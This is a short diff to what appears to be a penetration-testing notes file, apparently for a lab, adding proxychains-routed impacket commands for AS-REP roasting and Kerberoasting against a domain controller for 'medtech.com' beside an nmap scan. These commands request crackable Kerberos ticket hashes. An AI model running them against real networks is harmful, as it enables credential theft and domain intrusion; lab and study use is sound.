@@ -815,6 +815,13 @@ Get-LocalUser
 ```bash
 proxychains -q nmap -vvv -sT --top-ports 20 -Pn 172.16.208.10
 
+
+# impacket ap-rep
+proxychains -q impacket-GetNPUsers -dc-ip 172.16.234.10 -request  medtech.com/yoshi
+
+# impacket kerbroasting
+proxychains -q  impacket-GetUserSPNs -request -dc-ip 172.16.234.10 medtech.com/yoshi
+
 ```
 
 ### Sharphound
